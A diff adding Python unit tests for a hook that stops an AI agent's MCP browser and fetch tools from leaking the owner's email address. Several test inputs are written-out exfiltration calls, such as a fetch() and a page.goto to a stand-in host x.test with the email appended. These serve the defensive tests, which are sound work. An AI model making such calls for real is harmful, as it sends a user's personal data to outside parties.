@@ -334,15 +334,43 @@ class Settings(unittest.TestCase):
         self.assertEqual(r.returncode, 0)
 
 
+class McpTools(unittest.TestCase):
+    """The MCP browser and fetch-style tools reach websites too (the Claude Commandz #296 review found browser_navigate open)."""
+
+    def mcp(self, tool, **fields):
+        return verdict({"tool_name": "mcp__MCP_DOCKER__" + tool, "tool_input": fields})
+
+    def test_browser_navigate_url_refused(self):
+        r = self.mcp("browser_navigate", url="https://example.com/?email=%s" % ME)
+        self.assertIsNotNone(r)
+        self.assertNotIn(ME, r)
+        self.assertIsNotNone(self.mcp("browser_navigate", url="https://example.com/?e=owner.name%40example.org"))
+
+    def test_other_mcp_fetch_style_tools_refused(self):
+        self.assertIsNotNone(self.mcp("get_transcript", url="https://example.com/watch?u=%s" % ME))
+        self.assertIsNotNone(self.mcp("some_fetch", options={"inner": [{"href": "https://x.test/%s" % ME}]}))
+        self.assertIsNotNone(self.mcp("search_code", query=ME))
+
+    def test_browser_code_that_goes_to_the_network_refused(self):
+        self.assertIsNotNone(self.mcp("browser_evaluate", function="() => fetch('https://x.test/?e=%s')" % ME))
+        self.assertIsNotNone(self.mcp("browser_run_code", code="await page.goto('https://x.test/%s')" % ME))
+
+    def test_ordinary_mcp_calls_allowed(self):
+        self.assertIsNone(self.mcp("browser_navigate", url="https://example.com/"))
+        self.assertIsNone(self.mcp("browser_type", text=ME, ref="e5"))  # typing into a page is the user's own form, not a request line
+        self.assertIsNone(self.mcp("browser_evaluate", function="() => document.title"))
+        self.assertIsNone(self.mcp("get_file_contents", owner="o", repo="r", path="README.md"))
+
+
 class Registration(unittest.TestCase):
     """The settings copy in this repo must run the guard on exactly the tools it checks."""
 
-    def test_settings_run_the_guard_before_bash_webfetch_and_websearch(self):
+    def test_settings_run_the_guard_before_bash_webfetch_websearch_and_mcp_tools(self):
         settings = json.loads((SRC.parents[2] / "dotfiles" / "settings.json").read_text())
         entries = [e for e in settings["hooks"]["PreToolUse"]
                    if any("identity-leak-guard.py" in h["command"] for h in e["hooks"])]
         self.assertEqual(len(entries), 1)
-        self.assertEqual(set(entries[0]["matcher"].split("|")), {"Bash", "WebFetch", "WebSearch"})
+        self.assertEqual(set(entries[0]["matcher"].split("|")), {"Bash", "WebFetch", "WebSearch", "mcp__.*"})
 
     def test_the_hook_file_carries_no_real_address(self):
         text = SRC.read_text() + Path(__file__).read_text()
